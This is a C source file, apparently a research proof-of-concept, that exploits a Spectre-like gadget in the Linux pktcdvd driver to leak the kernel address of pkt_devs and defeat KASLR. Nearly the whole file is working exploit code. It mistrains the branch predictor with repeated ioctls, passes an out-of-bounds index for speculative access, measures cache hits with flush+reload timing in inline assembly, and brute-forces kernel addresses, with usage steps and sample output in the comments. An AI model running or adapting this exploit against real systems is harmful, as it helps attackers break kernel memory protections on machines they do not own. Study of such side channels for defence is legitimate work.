// Goal of this attack :
// - Leak address of kernel symbol "pkt_devs" via exploiting remaining spectre-like gadget.
// - If attacker can get the address, It can be exploited for bypassing security mechanism such as KASLR.
// 
// Assumption :
// - This is just PoC to show possibility which exploits remaining spectre-like gadget.
// - So This code requires several assumptions.
// --- No SMAP, No PTI (Page Table Isolation)
//
// Referenced CVE :
// - CVE-2010-3437
// - Original exploit code is from below.
// --- https://jon.oberheide.org/blog/2010/10/23/linux-kernel-pktcdvd-memory-disclosure/
// - Since this CVE has already fixed, Attacker can't exploit original vulnerability,
//   But There is still spectre-like gadget. We can exploit this again!
//
// Spectre-like gadget in pktcdvd :
// - pkt_find_dev_from_minor() in drivers/block/pktcdvd.c
//   if (dev_minor >= MAX_WRITERS)  ==> Bypass this check via speculative execution
//      return NULL;
//   return pkt_devs[dev_minor];  ==> Attacker can control dev_minor. Try to access from here to leak area.
//
// Usage :
// $ gcc -o leak_pkt_devs leak_pkt_devs.c
// $ sudo insmod /lib/modules/$(uname -r)/kernel/drivers/block/pktcdvd.ko
// & sudo cat /proc/kallsyms | grep pkt_devs  ==> ffffffffc05576a0 b pkt_devs     [pktcdvd]
// $ sudo ./leak_pkt_devs ffffffffc05573a0 ffffffffc0557aa0
//   mmap_addr : 10000
//   start bruteforce to get leak_area as kernel virtual address.
//   first index : 3fab8a60
//   Found kernel vaddr!! ffffffffc0557680, 3
//   Found kernel vaddr!! ffffffffc05576a0, 92
//   pkt_devs addr : ffffffffc05576a0  ==> succeed to infer address of pkt_devs!!
//
// ** Since this is based on probabilistic way, It is not reliable. Try a lot of times..
//
// Contact :
// - Jinbum Park <jinb.park7@gmail.com>
//
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <stdint.h>

#define PKT_DEVS_ELEM_SIZE (8)
#define MMAP_MIN_ADDR (0x10000UL)

#define DEV_INDEX 0
#define PKT_CTRL_CMD_STATUS 2

struct pkt_ctrl_command {
	uint32_t command;
	uint32_t dev_index;
	uint32_t dev;
	uint32_t pkt_dev;
	uint32_t num_devices;
	uint32_t padding;
};

#define PACKET_IOCTL_MAGIC ('X')
#define PACKET_CTRL_CMD _IOWR(PACKET_IOCTL_MAGIC, 1, struct pkt_ctrl_command)

char *mmap_addr = NULL;
char user_leak_area[4096] __attribute__((aligned(4096))) = {0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0xa0,};
unsigned long kernel_leak_area;
int pkt_fd;

void user_flush_cacheline(void *arg)
{
    asm volatile(
        "mov $0, %%eax\n\t"
        "cpuid\n\t" /* pleeeease don't do this speculatively :/ */
        "clflush %0"
	    : "+m" (*(volatile char *)arg)
	    : /* no inputs */
        : "ax", "bx", "cx", "dx");
}

int user_timed_reload(void *arg)
{
    int tsc1, tsc2, read_copy;
    asm volatile(
        "mov $0, %%eax\n\t"
        "cpuid\n\t" /* serialize; clobbers eax, ebx, ecx, edx */
        "rdtscp\n\t" /* counter into eax; clobbers edx, ecx */
        "mov %%eax, %0\n\t"
        "mov (%3), %%eax\n\t"
        "mov %%eax, %2\n\t"
        "rdtscp\n\t" /* counter into eax; clobbers edx, ecx */
        "mov %%eax, %1\n\t"
        : "=&r"(tsc1), "=&r"(tsc2), "=&r"(read_copy)
        : "r"((unsigned int *)arg)
        : "ax", "bx", "cx", "dx");
    return tsc2 - tsc1;
}

void try_speculative(uint32_t index)
{
	int i, ret;
	struct pkt_ctrl_command cmd;

	memset(&cmd, 0, sizeof(cmd));
	cmd.command = PKT_CTRL_CMD_STATUS;
	cmd.dev_index = 0;

	// mistraining
	for (i=0; i<128; i++) {
		ret = ioctl(pkt_fd, PACKET_CTRL_CMD, &cmd);
		if (ret < 0) {
			printf("[-] ioctl of pktcdvd device failed\n");
			exit(0);
		} 
	}

	// speculative
	memset(&cmd, 0, sizeof(cmd));
	cmd.command = PKT_CTRL_CMD_STATUS;
	cmd.dev_index = index;
	ret = ioctl(pkt_fd, PACKET_CTRL_CMD, &cmd);
	if (ret < 0) {
		printf("[-] ioctl of pktcdvd device failed\n");
		exit(0);
	}
}

unsigned long cand_start, cand_end;
unsigned long calc_kernel_vaddr_from_bruteforce(void)
{
    int time, i, repeat, hit, max_hit = -1;
    unsigned long area, progress = 0;
	unsigned long index, offset, ret_addr = 0;

	printf("start bruteforce to get leak_area as kernel virtual address.\n");
	printf("first index : %lx\n", mmap_addr - cand_start);

    for (area=cand_start; area<cand_end; area+=32) {
        hit = 0;
		offset = mmap_addr - area;
		index = (offset / PKT_DEVS_ELEM_SIZE);

        for (repeat=0; repeat<100; repeat++) {
            user_flush_cacheline(mmap_addr);
            try_speculative(index);
            time = user_timed_reload(mmap_addr);
            if (time < 100) {
				hit++;
            }
        }
        if (hit > 0) {
            printf("Found kernel vaddr!! %lx, %d\n", area, hit);
			if (hit > max_hit) {
				ret_addr = area;
				max_hit = hit;
			}
        }

        progress++;
        if ((progress % (1<<8)) == 0) {
            printf("progress : %lx\n", area);
        }
    }

    return ret_addr;
}

void pin_cpu(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &set)) {
		printf("error\n");
		exit(-1);
	}
}

int main(int argc, char **argv)
{
	int ret;
	struct pkt_ctrl_command cmd;
	unsigned long addr;

	if (argc != 3) {
		printf("USAGE: ./poc <bruteforce start addr> <bruteforce end addr>\n");
		return 0;
	}
	cand_start = strtoull(argv[1], NULL, 16);
	cand_end = strtoull(argv[2], NULL, 16);

	if (mlock(user_leak_area, sizeof(user_leak_area)) != 0) {
		printf("mlock error\n");
		return 0;
	}

	mmap_addr = mmap(MMAP_MIN_ADDR, 4096, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
	if (mmap_addr == MAP_FAILED) {
		printf("mmap error\n");
		return 0;
	}
	printf("mmap_addr : %lx\n", (unsigned long)mmap_addr);
	if (mlock(mmap_addr, 4096) != 0) {
		printf("mlock error\n");
		return 0;
	}
	pin_cpu(0);

	pkt_fd = open("/dev/pktcdvd/control", O_RDWR);
	if (pkt_fd < 0) {
		printf("[-] open of pktcdvd device failed\n");
		return 0;
	}

	/* Main goal of this attack :  Infer address of kernel symbol "pkt_devs" */
	/* No SMAP bypass */
	addr = calc_kernel_vaddr_from_bruteforce();
	printf("pkt_devs addr : %lx\n", addr);

out:
	close(pkt_fd);
	munmap(mmap_addr, 4096);
	return 0;
}
